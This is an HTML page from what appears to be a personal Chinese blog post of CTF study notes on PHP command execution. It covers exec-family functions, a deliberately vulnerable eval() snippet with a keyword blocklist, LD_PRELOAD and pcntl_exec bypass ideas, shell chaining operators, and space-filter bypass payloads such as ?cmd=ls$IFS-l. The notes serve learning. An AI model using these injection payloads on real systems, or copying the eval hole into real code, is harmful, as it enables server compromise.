@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html  lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg">
+    <script>
+    ;(function () {
+      const prefersDark =
+        window.matchMedia &&
+        window.matchMedia('(prefers-color-scheme: dark)').matches
+      const setting = localStorage.getItem('vueuse-color-scheme') || 'auto'
+      if (setting === 'dark' || (prefersDark && setting !== 'light'))
+        document.documentElement.classList.toggle('dark', true)
+    })()
+    </script>
+  <style type="text/css">
+    :root { color-scheme: light dark; --va-c-bg: #fff; }
+    html.dark { --va-c-bg: #000; }
+    html { background-color: var(--va-c-bg); }
+  </style><style id="valaxy-fouc">body{opacity:0!important}</style><style>body{transition:opacity .15s ease}</style><noscript><style>body{opacity:1!important}</style></noscript><script>(function foucGuardScript(maxDuration) {
+  var done = 0;
+  function reveal() {
+    if (done) return;
+    done = 1;
+    var s = document.getElementById("valaxy-fouc");
+    if (s) s.remove();
+  }
+  function check() {
+    var links = document.querySelectorAll('link[rel="stylesheet"]');
+    for (var i = 0; i < links.length; i++) {
+      if (!links[i].sheet) return;
+    }
+    reveal();
+  }
+  new MutationObserver(check).observe(document.head, {
+    childList: true,
+    attributes: true,
+    attributeFilter: ["media", "rel"]
+  });
+  addEventListener("load", reveal);
+  if (maxDuration)
+    setTimeout(reveal, maxDuration);
+})(5000)</script>
+    <script>
+    const locale = localStorage.getItem('valaxy-locale') || 'zh-CN';
+    document.documentElement.setAttribute('lang', locale);
+    </script>
+    
+  <script type="module" crossorigin src="/assets/index.DMmPyM9k.js"></script>
+  <link rel="modulepreload" crossorigin href="/assets/rolldown-runtime.CPPQDwIl.js">
+  <link rel="modulepreload" crossorigin href="/assets/framework.DfD1zdSt.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-i18n.BSMUyWAh.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/@vueuse/motion.B1bNFY-Z.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/dayjs.Do72Hm6d.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/pinia.CMOAtTts.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-router.DZdD3Cav.js">
+  <link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/nprogress.CQax14yo.js">
+  <link rel="stylesheet" crossorigin href="/assets/style.BqWFzkuS.css">
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.BQhdFMY1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.DMm9YOAa.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.Dq_IR9rO.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.BEiXGLvX.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.Di6jR-x-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.CTRA-rTL.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.CL6g_b3V.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.BsDP51OF.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.CTYiF6lA.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.Dxdc4cR9.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Cx986IdX.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Jm3AIy58.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.DxDJ3AOS.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.SpSLRI95.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.NWA7e6Wa.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.BMLOBm91.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.B22Nviop.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.Dr94JaBh.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.CZnvNsCZ.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.iY-2wyZ7.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.t53AETM-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.DA0__PXp.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.D1sUS0GD.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.DbIhKOiC.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.C3H0VqGB.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.DN2j7dab.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.DDBCnlJ7.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.CS6fqUqJ.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D3wIWfF6.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D5yQViql.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.mCD8mA8B.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.C195tn64.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.Dy4dx90m.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.oD1tc_U0.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size3-Regular.CTq5MqoE.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.Dl5lxZxV.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.BF-4gkZK.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.CO6r4hn1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.C0xS9mPB.woff" as="font" type="font/woff" crossorigin>
+<link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+<link rel="preload" href="/assets/none.DLM1AMsD.jpg" as="image">
+<link rel="preload" href="/assets/bg-img.kXdNMxcF.jpg" as="image">
+<link rel="preload" href="/assets/sidebar-bg-img.mp54gEws.webp" as="image">
+<link rel="modulepreload" crossorigin href="/assets/命令执行.Dtbv2QPZ.js">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>命令执行 - 北沐城歌</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&display=swap">
+<meta property="og:locale:alternate" content="en">
+<meta name="description" content="山行野宿，孤身万里">
+<meta property="og:description" content="山行野宿，孤身万里">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:site_name" content="北沐城歌">
+<meta property="og:title" content="命令执行">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://kinsey973.github.io/">
+<link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg" type="image/svg+xml">
+<meta name="generator" content="Valaxy 0.28.7">
+<meta name="theme-color" content="#fff">
+<meta name="msapplication-TileColor" content="#fff">
+<meta name="twitter:card" content="summary_large_image">
+</head>
+<body>
+  <div id="app"><!--[--><!--[--><!--[--><!----><!----><div class="yun-page-header-gradient"></div><div class="yun-nav-menu z-$yun-z-nav-menu fixed bg-transparent" data-v-1791e522><div class="inline-flex justify-start items-center flex-1" data-v-1791e522><button type="button" class="vt-hamburger menu-btn sidebar-toggle leading-4 size-12 lg:hidden" aria-label="mobile navigation" aria-expanded="false" inline-flex cursor="pointer" hover="bg-white/80 dark:bg-black/80" z="$yun-z-menu-btn" data-v-1791e522><span class="vt-hamburger-container"><span class="vt-hamburger-top"></span><span class="vt-hamburger-middle"></span><span class="vt-hamburger-bottom"></span></span></button><a href="/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 data-v-1791e522><!--[--><div class="size-6 i-ri-home-4-line"></div><!--]--></a><div class="hidden lg:contents" data-v-1791e522><!--[--><a href="/posts/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 title="menu.posts" data-v-1791e522><!--[--><div class="size-6 i-ri-article-line"></div><!--]--></a><!--]--></div></div><div class="flex flex-1 flex-center" data-v-1791e522><div flex="~ center col h-full" class="nav-menu-title-container cursor-pointer" data-v-1791e522><!----><span class="font-light truncate">北沐城歌</span></div></div><div class="inline-flex-center justify-end items-center flex-1" data-v-1791e522><button class="yun-icon-btn rounded-none! hidden sm:inline-flex" title="切换语言" style="color:var(--va-c-text);" data-v-1791e522><div i-ri-translate class="transition transform"></div></button><button class="yun-icon-btn yun-toggle-dark rounded-none!" title="切换深色模式" data-v-1791e522><div i="ri-sun-line dark:ri-moon-line"></div></button><!--[--><button class="yun-search-btn yun-icon-btn popup-trigger rounded-none! size-12 inline-flex justify-center items-center" text="xl $va-c-text" title="搜索"><div i-ri-search-line op-80 hover="op-100"></div></button><!----><!--]--></div></div><!----><!----><!----><!--[--><div class="yun-bg"></div><!--]--><!----><a href="#" class="back-to-top yun-icon-btn bg-$va-c-bg-soft shadow-md"><div class="size-8" i-ri-arrow-up-s-line></div><svg class="progress-circle-container" viewBox="0 0 100 100"><circle stroke-dasharray="301.59289474462014 301.59289474462014" stroke-dashoffset="301.59289474462014" stroke="currentColor" stroke-width="2" stroke-linecap="round" class="progress-circle" cx="50" cy="50" r="48" fill="none"></circle></svg></a><!--]--><!--[--><meting-js fixed="true" id="2049540645" server="netease" type="song" mini="true" mutex="false" listFolded="false" style=""></meting-js><!--]--><!----><!--]--><div class="min-h-screen flex flex-col"><div class="mt-12 md:mt-24 yun-layout-wrapper__content"><!--[--><div class="yun-layout-left gap-4 sticky top-$yun-margin-top w-80"><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden p-4 min-h-sm" flex="~ col gap-1" min-h="100px" bg="$va-c-bg-light"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><div class="site-info gap-1 items-center text-center" flex="~ col" p="t-8"><a href="/about" class="site-author-avatar inline-flex-center"><div class="relative yun-author-avatar"><div class="absolute size-full avatar-bg bg-image-$yun-home-hero-image-background-image filter-blur-2xl op-30"></div><img class="rounded-full size-full bg-white dark:bg-white/20 p-1 m-0 absolute" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png" alt="avatar"><span class="site-author-status absolute" title="The moonlight is beautiful.">💛</span></div></a><a href="/about" class="site-author-name font-black font-serif text-$va-c-text op-80 hover:op-100 flex-center">北歌</a><a href="/about/site" class="site-name text-lg leading-loose">北沐城歌</a><h4 class="site-subtitle block op-70" text="xs">北沐城歌|北歌的技术分享</h4><div class="site-description">山行野宿，孤身万里</div></div><div class="yun-gradient-line my-2 op-20"></div><nav class="site-nav" text-xl mt-2><a href="/archives/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="归档" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-archive-line"></div><div class="text-2xl icon-active i-ri-archive-fill"></div><span class="text-xs">归档</span></div><span class="count text-base text-black/80 dark:text-white/80">41</span></a><a href="/categories/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="分类" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-folder-2-line"></div><div class="text-2xl icon-active i-ri-folder-2-fill"></div><span class="text-xs">分类</span></div><span class="count text-base text-black/80 dark:text-white/80">6</span></a><a href="/tags/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="标签" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-price-tag-3-line"></div><div class="text-2xl icon-active i-ri-price-tag-3-fill"></div><span class="text-xs">标签</span></div><span class="count text-base text-black/80 dark:text-white/80">26</span></a></nav><div class="yun-gradient-line my-2 op-20"></div><div class="links-of-author"><!--[--><a class="links-of-author-item yun-icon-btn" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange;"><div class="i-ri-rss-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C;"><div class="i-ri-netease-cloud-music-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&amp;jump_from=webapi" title="QQ 2409101203" target="_blank" style="color:#12B7F5;"><div class="i-ri-qq-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494;"><div class="i-ri-github-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:white;"><div class="i-ri-train-line icon"></div></a><!--]--></div><div class="yun-gradient-line my-2 op-20"></div><div class="links flex-center"><!--[--><a href="/links/" class="va-link link-item yun-icon-btn" inline-flex title="网络世界的小伙伴们" style="color:hotpink;"><!--[--><div class="i-ri-open-arm-line icon size-6"></div><!--]--></a><a class="va-link link-item yun-icon-btn" inline-flex title="我的旧博客" style="color:#e16f00;" href="https://kinseyy.github.io/" target="_blank"><!--[--><div class="i-ri-quill-pen-line icon size-6"></div><!--]--><!----></a><a href="/categories/" class="va-link link-item yun-icon-btn" inline-flex title="分类" style="color:#f5f5f5;"><!--[--><div class="i-ri-apps-line icon size-6"></div><!--]--></a><a href="/tags/" class="va-link link-item yun-icon-btn" inline-flex title="标签" style="color:#f5f5f5;"><!--[--><div class="i-ri-bookmark-3-line icon size-6"></div><!--]--></a><!--]--></div><!--]--></div><!----></div><template></template><!--]--></div><main class="yun-main lt-md:w-full" flex="~ center"><!--[--><div class="content w-full md:w-3xl lg:w-2xl xl:w-2xl 2xl:w-4xl" flex="~ col grow" p="lt-md:0"><div class="yun-card flex-center rounded-2 overflow-hidden" flex="col" min-h="100px" bg="$va-c-bg-light" m="0"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><div class="mt-8 mb-4"><!--[--><header class="post-header"><h1 p="2" text="2xl center" font="serif black" style="color:" class="post-title flex-center"><!----><span inline-flex class="leading-none">命令执行</span></h1></header><!--]--></div><!--[--><!--[--><!--[--><!--[--><!----><div flex="~ center" text="sm" class="post-meta-col post-meta gap-4"><div class="post-time flex items-center gap-4"><span class="posted-time inline-flex-center gap-1" title="发表于2024-10-08 20:12:51"><div class="inline-block" i-ri-calendar-line></div><time class="op-80">2024-10-08</time></span><!----></div><!--[--><span id="busuanzi_container_page_pv"> 本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span><!--]--><div class="inline-flex-center gap-4"><div class="inline-flex-center post-counter gap-4"><span class="word-count inline-flex-center gap-1" title="本文字数"><div class="inline-block" i-ri-file-word-line></div><span class="op-80">4.3k</span></span><span class="reading-time inline-flex-center gap-1" title="阅读时长"><div i-ri-timer-line></div><time class="op-80">17m</time></span></div><!----><!----></div></div><!--]--><!----><div class="inline-flex mt-2" text="sm" py="1"><a href="/categories?category=%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" class="transition post-category inline-flex-center text-xs border-$va-c-divider" px-2 h="7" border rounded-full hover="bg-blue-500 text-white"><div m="x-1" inline-flex i-ri-folder-2-line></div><span>学习笔记</span></a><span mx="2"></span><div class="post-tags inline-flex" items="center" gap="1" flex="wrap 1" justify="end"><!--[--><a href="/tags/?tag=rce" class="transition post-tag inline-flex-center text-xs border-$va-c-divider" px-2 h="7" rounded-full border hover="bg-blue-500 text-white"><span>rce</span></a><!--]--></div></div><!--]--><!--]--><!--]--><div p="x-4 b-8" class="sm:px-6 lg:px-12 xl:px-16" w="full"><!--[--><!--]--><!--[--><article class="markdown-body"><!--[--><!----><!----><!--[--><!--]--><!--[--><p>摘要：命令执行 命令执行函数 system systemstring $command,int &amp;$returnval=? 常用参数：command：执行command参数所指定2的命令，并且输出执行结果 ​ 如果提供returnvar参数，则外部命令执行后的返回状态将会被设置到此变量中 ------。</p><p>&lt;!-- more --&gt;</p><h3 id="命令执行" tabindex="-1">命令执行 <a class="header-anchor" href="#命令执行" aria-label="Permalink to &quot;命令执行&quot;">​</a></h3><h3 id="命令执行函数" tabindex="-1">命令执行函数 <a class="header-anchor" href="#命令执行函数" aria-label="Permalink to &quot;命令执行函数&quot;">​</a></h3><h4 id="system" tabindex="-1"><strong>system</strong> <a class="header-anchor" href="#system" aria-label="Permalink to &quot;**system**&quot;">​</a></h4><p><strong>system(string $command,int &amp;$return_val=?)</strong></p><p>常用参数：command：执行command参数所指定2的命令，并且输出执行结果</p><p>​ 如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png" alt="image-20240415220301914" loading="lazy" decoding="async"></figure><hr><h4 id="exec" tabindex="-1"><strong>exec</strong> <a class="header-anchor" href="#exec" aria-label="Permalink to &quot;**exec**&quot;">​</a></h4><p><strong>exec(string $command,array&amp;$output=?,int&amp;$return_car=?)</strong></p><p>command参数：要执行的命令。单独使用时只有最后一行结果，且不会回显</p><p>output参数：用命令执行的输出填充此数组，每行输出填充数组中的一个元素。即逐行填充数组</p><p>需借用print_r输出结果</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152213807.png" alt="image-20240415221342762" loading="lazy" decoding="async"></figure><hr><h4 id="passthru" tabindex="-1"><strong>passthru</strong> <a class="header-anchor" href="#passthru" aria-label="Permalink to &quot;**passthru**&quot;">​</a></h4><p><strong>passthru(string $command,int &amp;$return_var=? )</strong></p><p>command 参数:要执行的命令</p><p>输出二进制数据，并且需要直接传送到浏览器</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152216415.png" alt="image-20240415221627371" loading="lazy" decoding="async"></figure><hr><h4 id="shell-exec" tabindex="-1"><strong>shell_exec</strong> <a class="header-anchor" href="#shell-exec" aria-label="Permalink to &quot;**shell_exec**&quot;">​</a></h4><p><strong>shell_exec</strong>(string $cmd)</p><p>cmd 参数：要执行的命令</p><p>环境执行命令，并且将完整的输出以字符串的方式返回。功能等同于反引号</p><p>借用 echo ，print返回输出结果</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152232616.png" alt="image-20240415223256581" loading="lazy" decoding="async"></figure><hr><h4 id="反引号" tabindex="-1">反引号 <a class="header-anchor" href="#反引号" aria-label="Permalink to &quot;反引号&quot;">​</a></h4><p><strong>反引号`cmd `</strong></p><p>在无字母，无数字的回显中使用极多</p><p>反引号也能执行系统指令</p><p>用echo/print来输出</p><hr><h4 id="popen" tabindex="-1">popen <a class="header-anchor" href="#popen" aria-label="Permalink to &quot;popen&quot;">​</a></h4><p><strong>popen(string $command,string $mode)</strong></p><p>commmand:要执行的命令</p><p>mode：模式。‘r’表示阅读，‘w’表示写入</p><p>fgets获取内容-&gt;print_r输出内容</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152243626.png" alt="image-20240415224354583" loading="lazy" decoding="async"></figure><hr><p>了解，跟popen函数差不多：<strong>proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)</strong></p><p>前三个参数是必要的</p><p>command：要执行的命令</p><p>descriptor_spec:定义数组的内容</p><p>pipes：调用数组内容</p><hr><h4 id="pcntl-exec" tabindex="-1">pcntl_exec <a class="header-anchor" href="#pcntl-exec" aria-label="Permalink to &quot;pcntl_exec&quot;">​</a></h4><p><strong>pcntl_exec(string $path,array$args=?,array$envs=?)</strong></p><p>path必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/user/local/bin/perl的perl脚本）</p><p>args是一个要传递给程序的参数的字符串数组</p><p>envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key=&gt;value格式的，key代表要传递的环境变量的名称，value代表该环境变量值</p><p>在当前进程空间执行指定程序</p><hr><h3 id="替换绕过函数" tabindex="-1">替换绕过函数 <a class="header-anchor" href="#替换绕过函数" aria-label="Permalink to &quot;替换绕过函数&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+header(&quot;content-type:text/html;charset=utf-8&quot;); 
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET[&#39;cmd&#39;])){
+    $c = $_GET[&#39;cmd&#39;];
+    if(!preg_match(&quot;/exec|system|popen|proc_open|\`/i&quot;, $c)){
+        eval($c);
+    }
+    else{
+        echo &quot;你是黑客么？&quot;;
+    }
+}
+</code></pre><button class="code-block-unfold-btn"></button></div><p>没有过滤passthru，使用passthru(“ls”)，查看目录</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161437313.png" alt="image-20240416143710195" loading="lazy" decoding="async"></figure><p>再次使用passthru(“cat flag.php”)在源码里查看flag文件</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161438824.png" alt="image-20240416143804717" loading="lazy" decoding="async"></figure><hr><hr><h3 id="" tabindex="-1"><a class="header-anchor" href="#" aria-label="Permalink to &quot;&quot;">​</a></h3><p><strong>LD_PRELOAD绕过原理</strong>（不懂，不理解）</p><p>使用场景：disable_functions禁用所有肯用到命令执行的函数</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161440425.png" alt="image-20240416144048258" loading="lazy" decoding="async"></figure><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161521446.png" alt="image-20240416152140349" loading="lazy" decoding="async"></figure><hr><h3 id="mail" tabindex="-1">mail() <a class="header-anchor" href="#mail" aria-label="Permalink to &quot;mail()&quot;">​</a></h3><h4 id="绕过条件" tabindex="-1">绕过条件 <a class="header-anchor" href="#绕过条件" aria-label="Permalink to &quot;绕过条件&quot;">​</a></h4><p>能够上传自己的.so文件</p><p>能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv函数未被禁止</p><p>存在可以控制PHP启动外部程序的函数并能执行(因为新进程启动将加载LD_PRELOAD中的.so文件)，比如mail()、imap_mail()、mb_send_mail()和error_log()等。</p><h4 id="构造payload" tabindex="-1">构造payload <a class="header-anchor" href="#构造payload" aria-label="Permalink to &quot;构造payload&quot;">​</a></h4><p>mail函数——调用子程序“/user/sbin/sendmail”——调动态链接库geteuid函数</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222117087.png" alt="image-20240422211743826" loading="lazy" decoding="async"></figure><hr><h4 id="evil-cmdline" tabindex="-1">EVIL_CMDLINE <a class="header-anchor" href="#evil-cmdline" aria-label="Permalink to &quot;EVIL_CMDLINE&quot;">​</a></h4><p>执行其他命令</p><hr><hr><h3 id="蚁剑及pcntl绕过函数过滤" tabindex="-1">蚁剑及pcntl绕过函数过滤 <a class="header-anchor" href="#蚁剑及pcntl绕过函数过滤" aria-label="Permalink to &quot;蚁剑及pcntl绕过函数过滤&quot;">​</a></h3><h4 id="蚁剑" tabindex="-1">蚁剑 <a class="header-anchor" href="#蚁剑" aria-label="Permalink to &quot;蚁剑&quot;">​</a></h4><p>使用工具</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222137215.png" alt="image-20240422213700006" loading="lazy" decoding="async"></figure><hr><h4 id="pcntl-exec函数" tabindex="-1">pcntl_exec函数 <a class="header-anchor" href="#pcntl-exec函数" aria-label="Permalink to &quot;pcntl_exec函数&quot;">​</a></h4><p><strong>pcntl_exec(string $path,array$args=?,array$envs=?)</strong></p><p>path必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/user/local/bin/perl的perl脚本）</p><p>args是一个要传递给程序的参数的字符串数组</p><p>envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key=&gt;value格式的，key代表要传递的环境变量的名称，value代表该环境变量值</p><p>在当前进程空间执行指定程序</p><p>path:/bin/bash args:-c/bin/ls</p><hr><p>info信息：没有禁用pcntl_exec函数</p><p>pcntl_exec函数没有回显</p><p>解决方法一：cat文件并输出到有权限读取路径；</p><p>解决方法二：shell反弹</p><hr><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222154839.png" alt="image-20240422215438700" loading="lazy" decoding="async"></figure><hr><h3 id="操作系统连接符" tabindex="-1">操作系统连接符 <a class="header-anchor" href="#操作系统连接符" aria-label="Permalink to &quot;操作系统连接符&quot;">​</a></h3><h4 id="-1" tabindex="-1">; <a class="header-anchor" href="#-1" aria-label="Permalink to &quot;;&quot;">​</a></h4><p>使多个命令按顺序执行</p><p>前面的命令和后面的命令都会执行</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222159031.png" alt="image-20240422215911843" loading="lazy" decoding="async"></figure><hr><h4 id="-2" tabindex="-1">&amp; <a class="header-anchor" href="#-2" aria-label="Permalink to &quot;&amp;&quot;">​</a></h4><p>使命令在后台运行</p><p>这样就可以同时执行多条命令</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222200738.png" alt="image-20240422220058617" loading="lazy" decoding="async"></figure><hr><h4 id="-3" tabindex="-1">&amp;&amp; <a class="header-anchor" href="#-3" aria-label="Permalink to &quot;&amp;&amp;&quot;">​</a></h4><p>若果前面的命令执行成功</p><p>则执行后面的命令</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222204341.png" alt="image-20240422220427195" loading="lazy" decoding="async"></figure><hr><h4 id="-4" tabindex="-1">| <a class="header-anchor" href="#-4" aria-label="Permalink to &quot;|&quot;">​</a></h4><p>将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数</p><p>前面的命令和后面的命令都会执行，但只显示后面的命令执行结果</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222207997.png" alt="image-20240422220722894" loading="lazy" decoding="async"></figure><hr><h4 id="-5" tabindex="-1">|| <a class="header-anchor" href="#-5" aria-label="Permalink to &quot;||&quot;">​</a></h4><p>类似于程序中的if-else语句</p><p>若前面的命令执行失败，则后面的命令就不会执行</p><p>若前面的命令执行失败，则执行后面的命令</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222212392.png" alt="image-20240422221217054" loading="lazy" decoding="async"></figure><hr><h3 id="空格过滤绕过" tabindex="-1">空格过滤绕过 <a class="header-anchor" href="#空格过滤绕过" aria-label="Permalink to &quot;空格过滤绕过&quot;">​</a></h3><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404231458831.png" alt="image-20240423145809746" loading="lazy" decoding="async"></figure><p><strong>绕过方法</strong></p><p><strong>1.大括号{cat,flag.txt};</strong></p><p><strong>2.$IFS代替空格；$IFS,${IFS},$IFS$9</strong></p><p>linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符</p><p>例子：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?cmd=ls$IFS-l
+</code></pre><button class="code-block-unfold-btn"></button></div><p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p><p>例子</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?cmd=ls${IFS}-l
+</code></pre><button class="code-block-unfold-btn"></button></div><p>*$IFS$9-后面加个$与{}类似，起截断作用，$9是当前系统shell进程的第九个参数的持有者，始终为空字符</p><p>例子</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?cmd=ls$IFS$9-l
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>3.重定向字符&lt;,&lt;&gt;;</strong></p><p>“&lt;”表示的是输入重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?cmd=cat&lt;flag.php
+
+?cmd=cat&lt;&gt;flag.php
